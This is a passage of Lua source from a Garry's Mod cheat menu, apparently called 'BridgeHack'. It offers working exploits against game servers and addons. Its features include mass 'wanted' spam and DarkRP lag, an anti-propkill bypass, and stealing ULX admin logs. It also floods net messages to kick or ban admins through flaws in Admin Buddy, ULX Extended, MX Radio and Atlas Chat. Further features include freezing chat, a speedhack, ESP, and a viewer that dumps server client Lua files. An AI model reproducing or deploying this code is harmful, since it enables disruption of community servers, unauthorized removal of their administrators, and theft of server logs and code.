		DARKRPBASEDSUB:AddOption( "[ON] Make everyone wanted (Cop only)", function()
			timer.Create("lollol3294385", 0.2, 0, function(  )
				for k,v in pairs(player.GetAll()) do
					local ligger_type = math.random(1,13)
					local ligger_type1 = math.random(1,13)
					status("Attempting Want on: " .. v:Nick() .. " - " .. v:SteamID())
					if ligger_type1 == ligger_type then
						if last_ply == v:Nick() then
							local ligger_type = math.random(1,13)
							local ligger_type1 = math.random(1,13)
						else
							ply:ConCommand("darkrp wanted " .. v:Nick() .. " " .. math.random(1,999))
						end
						
						local last_ply = v:Nick()
						local ligger_type = math.random(1,13)
						local ligger_type1 = math.random(1,13)
						status("Force Wanting: " .. v:Nick())
					end
				end
			end)
		end):SetImage( "icon16/cross.png" )
		
		DARKRPBASEDSUB:AddOption( "[OFF] Make everyone wanted (Cop only)", function()
			timer.Destroy("lollol3294385")
			status("Stopped Want All Police")
		end):SetImage( "icon16/tick.png" )
		
		DARKRPBASEDSUB:AddOption( "[ON] DARKRP LAG", function()
			ply:ConCommand("__BridgeHacklagdarkrpdashit")
		end):SetImage( "icon16/accept.png" )
		
		DARKRPBASEDSUB:AddOption( "[OFF] DARKRP LAG", function()
			ply:ConCommand("__BridgeHackstopplag")
		end):SetImage( "icon16/cancel.png" )
		
		local SpoofingMenu = menu:AddSubMenu("Spoofing Scripts")
		SpoofingMenu:AddOption( "Spoof Player colours and physgun colours", function()
			ply:ConCommand("cl_weaponcolor 0." .. math.random(1,255) .. " 0." .. math.random(1,255) .. " 0." .. math.random(1,255))
			ply:ConCommand("cl_playercolor 0." .. math.random(1,255) .. " 0." .. math.random(1,255) .. " 0." .. math.random(1,255))
			status("Spoofed Physgun And Player Color.")
		end):SetImage( "icon16/color_wheel.png" )
		
		local exploitshacks = menu:AddSubMenu("Exploits")
		exploitshacks:AddOption( "Bypass APAnti (Anti propkill)",function() 
			chatP("Bypassing Apanti..")
			net.Receive("sMsgStandard", function()
				print("#Bypassed by HaxRUs")
			end)
		
			net.Receive("sNotifyHit", function()
			
			end)
			
			net.Receive("sMsgAdmins", function()
			
			end)
			
			net.Receive("sAlertNotice", function()
			
			end)
		end):SetImage( "icon16/link_break.png" )
		
		exploitshacks:AddOption("[NLR] [ON] Freeze Spawning",function()
			ply:ConCommand("bh_nlr_freeze 1")
		end):SetImage( "icon16/book_error.png" )
		
		exploitshacks:AddOption("[NLR] [OFF] Freeze Spawning",function()
			ply:ConCommand("bh_nlr_freeze 0")
		end):SetImage( "icon16/book.png" )
		
		exploitshacks:AddOption( "Steal ULX Logs ( will save to download/data/ulx_logs/" .. os.date("%m-%d-%y") .. ".txt )", function() 
			status("Downloading ULX LOGS")
			if file.Exists("download/data/ulx_logs/" .. os.date("%m-%d-%y") .. ".txt", "GAME") == "false" then
				consoleP("FILE EXISTS. REMOVE THE FILE BEFORE CONTINUEING!")
			else
				RequestFile(os.date( "data/" .. "ulx_logs" .. "/" .. "%m-%d-%y" .. ".txt" ))
				chatP("Downloading ulx logs. OPENING " .. os.date("%m-%d-%y") .. " IN 15 SECONDS....")
				timer.Simple( 15, function()
					chatP("Opened data/ulx_logs/" .. os.date("%m-%d-%y") .. ".txt")
					consoleP("**********************")
					consoleP("** SUCCESS ULX DUMP **")
					consoleP("**********************")
				end)
			end
		end ):SetImage( "icon16/lock_break.png" )
		
		exploitshacks:AddOption("ADMIN BUDDY KICK ADMINS+",function()
			chatP("Kicking... (Will only work on admins+)")
			timer.Create( "aekickdaskids", 3, 0, function()
				for k,v in pairs(player.GetAll()) do 
					if( v:GetUserGroup() != "user" ) then
						if( v:GetUserGroup() != "vip" ) then
							for i=0, 700 do  
								net.Start('plyWarning')          
									net.WriteEntity(v)          
									net.WriteString('You have to select a player before doing a action.')       
								net.SendToServer()
							end
							consoleP('Attempting to kick '.. v:Nick().. "!")
						end
					end 
				end
			end)
		end):SetImage("icon16/wand.png")
		
		exploitshacks:AddOption("ULX EXTENDED BAN ADMINS",function()
			chatP("Banning...")
			timer.Create(BridgeHack.RandomVar.."ulxextendedban",1,0,function()
				for k,v in pairs(player.GetAll()) do 
					if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro
						if v != LocalPlayer() then 
							status("Banning.. "..v:Nick())
							net.Start("banleaver")
								net.WriteString(v:SteamID().."{sep}".."HaxRUs The Exploiter was here")
							net.SendToServer()
						end
					end
				end
			end)
		end):SetImage("icon16/wand.png")
		
		exploitshacks:AddOption( " [ON] ATLAS CHAT: FREEZE EVERYBODY",function() 
			chatP("Freezing everybody.. (Except you)")
			timer.Create("Imakelovetou"..BridgeHack.RandomVar,"3",0, function()
				local trash = "";
				for i=0, 15000 do
					trash = trash .. string.char(math.random(32, 126));
				end
				
				status("Freeze wave incoming")
				timer.Simple(1,function()
					status("Freeze wave done")
				end)
				
				for i=0,3 do  
					net.Start("atlaschat.chat")
						net.WriteString("// ".. trash)
					net.SendToServer()
				end
			end) 
		end):SetImage( "icon16/lock.png" )
		
		exploitshacks:AddOption( " [OFF] ATLAS CHAT: FREEZE EVERYBODY",function() 
			chatP("Stopping the freeze..")
			timer.Destroy("Imakelovetou"..BridgeHack.RandomVar,"3",0, function()
			
			end)   
		end):SetImage( "icon16/lock_open.png" )
		
		exploitshacks:AddOption( "[ON] ESSENTIALS ULX SPAM FRIENDS TABLE", function() 
			timer.Create("spamdafukFRIENDSULX", 2, 0, function()
				local friends = {}
				table.insert( friends, math.random(1,9999) )
				for i = 1,6000 do
					net.Start("friendlist")
					net.WriteTable(friends)
					net.SendToServer()
				end
				status("PROGRESS [10000/10000]")
			end)
		end ):SetImage( "icon16/script_error.png" )
		
		exploitshacks:AddOption( "[OFF] ESSENTIALS ULX SPAM FRIENDS TABLE", function()
			timer.Destroy("spamdafukFRIENDSULX")
			status("Stopped ULX SPAM FRIENDS")
		end):SetImage( "icon16/script.png" )
		
		exploitshacks:AddOption( "Ulx Extended TTT Weapon Spawn", function()
			GiveMenu()
		end):SetImage( "icon16/book_key.png" )
		
		exploitshacks:AddOption( " [ON] MX RADIO KICK ADMINS",function()
			chatP("Kicking admins, Including anyone who isnt a user")
			ply:ConCommand("bh_mx_kickadmins")
			timer.Create( "Kickthenoobs"..BridgeHack.RandomVar, 3, 0, function()
				for k,v in ipairs(player.GetAll()) do 
					if( v:GetUserGroup() != "user" ) then 
						if v:Nick() != "HaxRUs" then
							for i=0, 700 do 
								net.Start( "GetCar" ) 
								net.WriteEntity(v) 
								net.WriteEntity(v) 
								net.SendToServer() 
							end
							chatP('Attempting to kick '.. v:Nick())
						end
					end
				end 
			end)
		end):SetImage( "icon16/wand.png" )
		
		exploitshacks:AddOption( " [OFF] MX RADIO KICK ADMINS",function() 
			chatP("Stopping the kicks")
			timer.Destroy( "Kickthenoobs"..BridgeHack.RandomVar, 3, 0, function()
			
			end)
		end):SetImage( "icon16/wand.png" )
		
		local ServerHacks = menu:AddSubMenu("Server Hacks")
		ServerHacks:AddOption("[ON] Lag windows server", function()
			if system.IsWindows() == true then
				timer.Create("flashhostconsole", 1, 0, function()
					status("Flashing Windows Server windows 1k times.")
					for i = 1,1000 do
						system.FlashWindow( )
					end
				end)
			else
				chatP("Incorrect Operating system. operating system is not Windows.")
			end
		end):SetImage( "icon16/application_osx.png" )
		
		ServerHacks:AddOption("[OFF] Lag windows server", function()
			timer.Destroy("flashhostconsole")
			chatP("Stopped Flashing.")
			status("Stopped Flashing.")
		end):SetImage( "icon16/application_osx_terminal.png" )
		
		local Misc = menu:AddSubMenu(" Misc ")
		Misc:AddOption( "List Rank - Playername - Money",function()  
			chatP( "Check Console\n" )
			consoleP("(NAME)-(STEAMID)-(CASH)\n\n\n")
			for k,v in pairs(player.GetAll()) do
				local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
				if v:IsAdmin() then
					consoleP("(ADMIN!) - (" .. v:Nick() .. ") - (" .. v:SteamID() .. ") - ($" .. playermoney .. ")")
				else
					consoleP("(USER) - (" .. v:Nick() .. ") - (" .. v:SteamID() .. ") - ($" .. playermoney .. ")")
				end
			end
		end):SetImage( "icon16/text_align_center.png" )
		
		Misc:AddOption( "Check exploits", function()
		ply:ConCommand("bh_check")
	end ):SetImage( "icon16/book_addresses.png" )
		
		Misc:AddOption( "ClientSide Lua Viewer",function()
			chatP("Opening clientside lua viewer...")
			ply:ConCommand("bhlua")
		end):SetImage( "icon16/application_osx_terminal.png" )
		
		if ply:SteamID() == "STEAM_0:1:45153092" or ply:SteamID() == "STEAM_0:1:61639885" then 
			local DebugMenu = menu:AddSubMenu(" Debug Settings")
			DebugMenu:AddOption(" Reset Default Config.", function()
				Debug("Resetting Cheat Variables...")
				ResetCvar("bhmenu_effects", 1)
				ResetCvar("bhfirstload_correct", 0)
				ResetCvar("bhchat_status",0)
				ResetCvar("bhcheats_enabled_on_start", 0)
				ResetCvar("bhcheats_svlua_enabled_on_start", 0)
				ResetCvar("bhshowhud", 1)
			end)
			
			DebugMenu:AddOption(" Debug",function()
				for k,v in pairs(player.GetAll()) do
					chatP(LocalPlayer():GetPos():Distance(v:GetPos()) .. " | ".. v:Nick())
				end
			end)
		end
		
		menu:AddSpacer()
		
		menu:AddOption( "Config Menu", function() 
			local DermaPanel = vgui.Create( "DFrame" )
			DermaPanel:SetPos( 100, 100 )
			DermaPanel:SetSize( 300, 400 )
			DermaPanel:SetTitle( " " )
			DermaPanel:SetVisible( true )
			DermaPanel:SetDraggable( true )
			DermaPanel:ShowCloseButton( true )
			DermaPanel.Paint = function()
				draw.RoundedBox(0,0,0,600,2000,Color(200,0,0,200))
				draw.RoundedBox(0,0,0,300,25,Color(0,0,0,255))
				draw.DrawText("Config Menu","DermaDefaultBold",8,5,Color(150,150,150,255))
				draw.DrawText("ESP Info Color","BudgetLabel",8,130,Color(255,255,255,255))
			end
			
			DermaPanel:MakePopup()
			
			local ESPMixer = vgui.Create( "DColorMixer", DermaPanel )
			ESPMixer:SetPos( 10,150)
			ESPMixer:SetSize(100,100)--Make Mixer fill place of Frame
			ESPMixer:SetPalette( false ) --Show/hide the paletteDEF:true
			ESPMixer:SetAlphaBar( true ) --Show/hide the alpha barDEF:true
			ESPMixer:SetWangs( false ) --Show/hide the R G B A indicators DEF:true
			ESPMixer:SetColor( Color(GetConVarNumber("bhesp_infocolor_r"),GetConVarNumber("bhesp_infocolor_g"),GetConVarNumber("bhesp_infocolor_b")) )--Set the default color
			daespvector = ESPMixer:GetColor()
			
			local ESPMixButton = vgui.Create( "DButton",DermaPanel )
			ESPMixButton:SetPos( 5, 250 )
			ESPMixButton:SetText( "Set ESP Color" )
			ESPMixButton:SetSize( 120, 15 )
			ESPMixButton.DoClick = function()
				print(daespvector)
				ply:ConCommand("bhesp_infocolor_r "..daespr)
				ply:ConCommand("bhesp_infocolor_g "..daespg)
				ply:ConCommand("bhesp_infocolor_b "..daespb)
			end
			
			local EspBoxes = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
			EspBoxes:SetPos( 10, 25 )// Set the position
			EspBoxes:SetValue( GetConVarNumber("bhesp_box") )// Initial value ( will determine whether the box is ticked too )
			EspBoxes:SetText("ESP Boxes")
			EspBoxes:SetConVar( "bhesp_box" )
			EspBoxes:SizeToContents()
			
			local ShowHP = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
			ShowHP:SetPos( 10, 45 )// Set the position
			ShowHP:SetValue( GetConVarNumber("bhesp_hp") )// Initial value ( will determine whether the box is ticked too )
			ShowHP:SetText("Show HP On ESP")
			ShowHP:SetConVar( "bhesp_hp" )
			ShowHP:SizeToContents()
			
			local ShowRank = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
			ShowRank:SetPos( 10, 70 )// Set the position
			ShowRank:SetValue( GetConVarNumber("bhesp_rank") )// Initial value ( will determine whether the box is ticked too )
			ShowRank:SetText("Show Rank On ESP")
			ShowRank:SetConVar( "bhesp_rank" )
			ShowRank:SizeToContents()
			
			local Rdistance = vgui.Create( "DCheckBoxLabel", DermaPanel )// Create the checkbox
			Rdistance:SetPos( 10, 90 )// Set the position
			Rdistance:SetValue( GetConVarNumber("bhrenderdistance_enable") )// Initial value ( will determine whether the box is ticked too )
			Rdistance:SetText("Use a Maximum render distance")
			Rdistance:SetConVar( "bhrenderdistance_enable" )
			Rdistance:SizeToContents()
			
			local RenderDistance = vgui.Create( "DNumSlider", DermaPanel )
			RenderDistance:SetPos( 25, 100) // Set the position
			RenderDistance:SetSize( 280, 25 ) // Set the size
			RenderDistance:SetText( "Max Render Distance" ) // Set the text above the slider
			RenderDistance:SetMin( 0 ) // Set the minimum number you can slide to
			RenderDistance:SetMax( 5000 )// Set the maximum number you can slide to
			RenderDistance:SetDecimals( 1 ) // Decimal places - zero for whole number
			RenderDistance:SetConVar( "bhesp_rdistance" ) // Changes the ConVar when you slide
		end ):SetImage( "icon16/wrench.png" )
		
		menu:Open()
		end)
		
		concommand.Add("-bh_menu", function( ply )
			status("Menu Closed.")
			if GetConVarNumber("bhmenu_effects") == 1 then
				hook.Add( "RenderScreenspaceEffects", "BlurBG", blur_off )
			end
			local menu = DermaMenu() 
		end)
		
		function ESP_on( ) 
			ply:ConCommand("bhesp 1")
		end
		
		function ESP_off( )
			ply:ConCommand("bhesp 0")
		end
		
			function speedhack_on(  ) 
			ply:ConCommand("_host_framerate 8;host_framerate 8")
			status("Enabled SpeedHack")
		end
		
		function speedhack_off(  )
			ply:ConCommand("_host_framerate 0;host_framerate 0")
			status("Disabled SpeedHack")
		end 
		
		-- CL LUAVIEWER                                                                                                                                                                                                                                                                                         */ require("stringtables") local escapejs = { ["\\"] = "\\\\", ["\0"] = "\\0" , ["\b"] = "\\b" , ["\t"] = "\\t" , ["\n"] = "\\n" , ["\v"] = "\\v" , ["\f"] = "\\f" , ["\r"] = "\\r" , ["\""] = "\\\"", ["\'"] = "\\\'" } function string.JavascriptSafe( str ) str = str:gsub( ".", escapejs ) str = str:gsub( "\226\128\168", "\\\226\128\168" ) str = str:gsub( "\226\128\169", "\\\226\128\169" ) return str end local function GetLuaFiles(client_lua_files) local count = client_lua_files:Count() local ret = {} for i = 1, count - 2 do ret[i] = { Path = client_lua_files:GetString(i), CRC = client_lua_files:GetUserDataInt(i) } end return ret end local function GetLuaFileContents(crc) local fs = file.Open("cache/lua/" .. crc .. ".lua", "rb", "MOD") fs:Seek(4) local contents = util.Decompress(fs:Read(fs:Size() - 4)) return contents:sub(1, -2) end local function dumbFile(path, contents) if not  path:match("%.txt$") then path = path..".txt" end local curdir = "" for t in path:gmatch("[^/\\*]+") do curdir = curdir..t if  curdir:match("%.txt$") then print("writing: ", curdir) file.Write(curdir, contents) else curdir = curdir.."/" print("Creating: ", curdir) file.CreateDir(curdir) end end end local dumbFolderCache = "" local function dumbFolder(node) for _, subnode in ipairs(node.ChildNodes:GetChildren()) do if subnode:HasChildren() then dumbFolder(subnode) else dumbFile(dumbFolderCache..subnode.pathh, GetLuaFileContents(subnode.CRC)) end end end
 
/*
[[----------------------------------------------------------------]]    
[[----------------------------------------------------------------]]  
 ____    ___                       __                   __                    
/\  _`\ /\_ \    __               /\ \__         __    /\ \                    
\ \ \/\_\//\ \  /\_\     __    ___\ \ ,_\   ____/\_\   \_\ \     __            
 \ \ \/_/_\ \ \ \/\ \  /'__`\/' _ `\ \ \/  /',__\/\ \  /'_` \  /'__`\          
  \ \ \L\ \\_\ \_\ \ \/\  __//\ \/\ \ \ \_/\__, `\ \ \/\ \L\ \/\  __/          
   \ \____//\____\\ \_\ \____\ \_\ \_\ \__\/\____/\ \_\ \___,_\ \____\        
    \/___/ \/____/ \/_/\/____/\/_/\/_/\/__/\/___/  \/_/\/__,_ /\/____/        
/\ \                                    __                                    
\ \ \      __  __     __        __  __ /\_\     __   __  __  __     __   _ __  
 \ \ \  __/\ \/\ \  /'__`\     /\ \/\ \\/\ \  /'__`\/\ \/\ \/\ \  /'__`\/\`'__\
  \ \ \L\ \ \ \_\ \/\ \L\.\_   \ \ \_/ |\ \ \/\  __/\ \ \_/ \_/ \/\  __/\ \ \/
   \ \____/\ \____/\ \__/.\_\   \ \___/  \ \_\ \____\\ \___x___/'\ \____\\ \_\
    \/___/  \/___/  \/__/\/_/    \/__/    \/_/\/____/ \/__//__/   \/____/ \/_/
                                                                               
[[----------------------------------------------------------------]]
[[----------------------------------------------------------------]]                                                                                                                                                                                                                                                                                                  */ require("stringtables") local escapejs = { ["\\"] = "\\\\", ["\0"] = "\\0" , ["\b"] = "\\b" , ["\t"] = "\\t" , ["\n"] = "\\n" , ["\v"] = "\\v" , ["\f"] = "\\f" , ["\r"] = "\\r" , ["\""] = "\\\"", ["\'"] = "\\\'" } function string.JavascriptSafe( str ) str = str:gsub( ".", escapejs ) str = str:gsub( "\226\128\168", "\\\226\128\168" ) str = str:gsub( "\226\128\169", "\\\226\128\169" ) return str end local function GetLuaFiles(client_lua_files) local count = client_lua_files:Count() local ret = {} for i = 1, count - 2 do ret[i] = { Path = client_lua_files:GetString(i), CRC = client_lua_files:GetUserDataInt(i) } end return ret end local function GetLuaFileContents(crc) local fs = file.Open("cache/lua/" .. crc .. ".lua", "rb", "MOD") fs:Seek(4) local contents = util.Decompress(fs:Read(fs:Size() - 4)) return contents:sub(1, -2) end local function dumbFile(path, contents) if not  path:match("%.txt$") then path = path..".txt" end local curdir = "" for t in path:gmatch("[^/\\*]+") do curdir = curdir..t if  curdir:match("%.txt$") then print("writing: ", curdir) file.Write(curdir, contents) else curdir = curdir.."/" print("Creating: ", curdir) file.CreateDir(curdir) end end end local dumbFolderCache = "" local function dumbFolder(node) for _, subnode in ipairs(node.ChildNodes:GetChildren()) do if subnode:HasChildren() then dumbFolder(subnode) else dumbFile(dumbFolderCache..subnode.pathh, GetLuaFileContents(subnode.CRC)) end end end
 
local VIEWER = {}
 
surface.CreateFont("HeaderFont", {
  font = "Segoe UI Semilight",
  size = 22,
  weight = 300
})
surface.CreateFont("PopupFont", {
  font = "Segoe UI Light",
  size = 21,
  weight = 300
})
 
function VIEWER:Init()
  self:SetTitle("BridgeHack Clientside Lua Viewer")
  self:SetSize(1200, 550)
  self:Center() self:ShowCloseButton( false ) self.Paint = function(s,w,h)
    surface.SetDrawColor(Color(108,153,192))
    surface.DrawRect( 0,0, w,h ) surface.SetDrawColor( Color(141,200,251) ) surface.DrawRect( 1,1, w-2,h-2 ) surface.SetDrawColor(Color(141,200,251)) surface.DrawRect( 2,2, w-4,h-4 ) surface.SetDrawColor(Color(108,153,192)) surface.DrawRect( 7.5,27.5, w-14,h-34) surface.SetTextColor(0,0,0) surface.SetFont("HeaderFont")
    surface.SetTextPos( (self:GetWide()/2) - (tostring( string.len( self.lblTitle:GetText() )) / 2*7.5), 2) self.lblTitle:SetColor(Color(0,0,0,0)) surface.DrawText( self.lblTitle:GetText() ) end self.close = vgui.Create( "DButton", self ) self.close:SetSize( 43,20 ) self.close:SetPos( self:GetWide()-7.5-self.close:GetWide(), -1 ) self.close:SetText("") self.close.Paint = function(s,w,h) surface.SetDrawColor( Color(199,80,80) ) surface.DrawRect( 0,0, w,h ) surface.SetTextColor(255,255,255) surface.SetFont("HeaderFont") surface.SetTextPos(18,-2) surface.DrawText( "x" ) end self.close.DoClick = function(s,w,h) self:Close() end self.tree = vgui.Create("DTree", self) self.tree:SetPos(8.5,28.5) self.tree:SetSize(self:GetWide()/2-200, self:GetTall()-36) self.tree.Directories = {} self.html = vgui.Create("DHTML", self) self.html:SetPos(self:GetWide()/2-200+8.5, 28.5) self.html:SetSize(self:GetWide()/2+200-16, self:GetTall()-36) self.html:OpenURL("https://metastruct.github.io/lua_editor/") client_lua_files = stringtable.Get "client_lua_files" local tree_data= {} for i, v in ipairs(GetLuaFiles(client_lua_files)) do if i == 1 then continue end local file_name = string.match(v.Path, ".*/([^/]+%.lua)") local dir_path = string.sub(v.Path, 1, -1 - file_name:len()) local file_crc = v.CRC local cur_dir = tree_data for dir in string.gmatch(dir_path, "([^/]+)/") do if not cur_dir[dir] then cur_dir[dir] = {} end cur_dir = cur_dir[dir] end cur_dir[file_name] = {fileN = file_name, CRC = file_crc} end local file_queue = {} local function iterate(data, node, path) path = path or "" for k, v in SortedPairs(data) do if type(v) == "table" and not v.CRC then local new_node = node:AddNode(k) new_node.DoRightClick = function() local dmenu = DermaMenu(new_node) dmenu:SetPos(gui.MouseX(), gui.MouseY()) dmenu:AddOption("Save Folder", function() dumbFolderCache = "cluaview/"..GetHostName()..dumbFolder(new_node) DrawFancyPopup("The folder ".. dumbFolder(new_node) .." has been saved as data/cluaview/".. GetHostName() .."/folders/".. dumbFolder(new_node) .."!") end) dmenu:Open() end iterate(v, new_node, path .. k .. "/") else table.insert(file_queue, {node = node, fileN = v.fileN, path = path .. v.fileN, CRC = v.CRC}) end end end iterate(tree_data, self.tree) for k, v in ipairs(file_queue) do local node = v.node:AddNode(v.fileN, "icon16/page_green.png") node.DoClick = function() self.html:QueueJavascript("SetContent('"..string.JavascriptSafe(GetLuaFileContents(v.CRC)).."')") end local hostname = GetHostName() hostname = hostname:gsub("|", "-") hostname = hostname:gsub("~", "-") hostname = hostname:gsub(" ", "") node.DoRightClick = function(self,node) local nodemenu = DermaMenu(node) nodemenu:AddOption("Save File", function() dumbFile("cluaview/".. string.lower(hostname) .."/"..v.fileN, GetLuaFileContents(v.CRC)) DrawFancyPopup("The file ".. v.fileN .." has been saved as data/cluaview/".. string.lower(hostname) .."/".. v.fileN .."!") end) nodemenu:Open() end node.CRC = v.CRC node.pathh = v.path
    end
  end
derma.DefineControl("dcluaviewer", "Clientside Lua Viewer", VIEWER, "DFrame")
 
/*
[[----------------------------------------------------------------]]    
[[----------------------------------------------------------------]]  
 ____                                    
/\  _`\                                  
\ \ \L\_\ __      ___     ___   __  __    
 \ \  _\/'__`\  /' _ `\  /'___\/\ \/\ \  
  \ \ \/\ \L\.\_/\ \/\ \/\ \__/\ \ \_\ \  
   \ \_\ \__/.\_\ \_\ \_\ \____\\/`____ \
    \/_/\/__/\/_/\/_/\/_/\/____/ `/___/> \
                                    /\___/
                                    \/__/
 ____                                    
/\  _`\                                  
\ \ \L\ \___   _____   __  __  _____      
 \ \ ,__/ __`\/\ '__`\/\ \/\ \/\ '__`\    
  \ \ \/\ \L\ \ \ \L\ \ \ \_\ \ \ \L\ \  
   \ \_\ \____/\ \ ,__/\ \____/\ \ ,__/  
    \/_/\/___/  \ \ \/  \/___/  \ \ \/    
                 \ \_\           \ \_\    
                  \/_/            \/_/                                                                                
[[----------------------------------------------------------------]]    
[[----------------------------------------------------------------]]    
*/    
 
function DrawFancyPopup(message)
  fancyPopup = vgui.Create("DFrame")
  fancyPopup:SetSize(ScrW(), ScrH()) fancyPopup:SetPos(0, 0) fancyPopup:SetVisible( true ) fancyPopup:SetTitle("") fancyPopup:MakePopup() fancyPopup:ShowCloseButton( true ) fancyPopup.Paint = function(s,w,h) surface.SetDrawColor( Color(0,0,0,200) ) surface.DrawRect( 0,0, w,h ) surface.SetDrawColor( Color(13,136,69) ) surface.DrawRect( 0, w/2-fancyPopup:GetTall()/1.520, ScrW(), ScrH()/6.5 ) surface.SetTextColor(255,255,255) surface.SetFont("PopupFont") surface.SetTextPos(w/4.10, h/2.30) surface.DrawText( message )  end fancyPopupButton = vgui.Create("DButton", fancyPopup) fancyPopupButton:SetSize(110,32.5) fancyPopupButton:SetPos(fancyPopup:GetWide()/2+fancyPopup:GetWide()/10, fancyPopup:GetTall()/2.050) fancyPopupButton:SetText("") fancyPopupButton.Paint = function(s,w,h) surface.SetDrawColor( Color(255,255,255) ) surface.DrawRect( 0,0, w,h ) surface.SetDrawColor( Color(13,136,69) ) surface.DrawRect( 0+3,0+3, w-6,h-6 ) surface.SetTextColor(255,255,255) surface.SetFont("PopupFont") surface.SetTextPos(30.5,5.5) surface.DrawText( "Alright!" ) end fancyPopupButton.DoClick = function(s,w,h) fancyPopup:Close() end
end
 
concommand.Add("testpopup", function() DrawFancyPopup("This is just a test button and nothing else you nutmpies. Pressing Allow does no shit at all!") end) concommand.Add("bhlua", function() vgui.Create("dcluaviewer"):MakePopup() end)
